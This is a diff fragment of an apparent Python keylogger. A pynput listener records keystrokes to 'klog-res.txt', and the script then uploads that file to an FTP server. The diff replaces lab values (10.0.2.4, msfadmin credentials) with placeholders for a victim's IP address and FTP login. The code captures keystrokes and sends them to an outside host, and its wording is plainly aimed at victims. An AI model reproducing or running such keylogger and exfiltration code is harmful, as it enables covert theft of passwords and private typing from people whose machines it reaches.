@@ -22,7 +22,7 @@ with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
 
 print("\nConnecting to FTP and sending data...")
 
-sess=ftplib.FTP("10.0.2.4","msfadmin","msfadmin")
+sess=ftplib.FTP("<victim's IP address>","<victim's FTP username>","victim's FTP password")
 
 file = open("klog-res.txt","rb")
 sess.storbinary("STOR klog-res.txt",file)
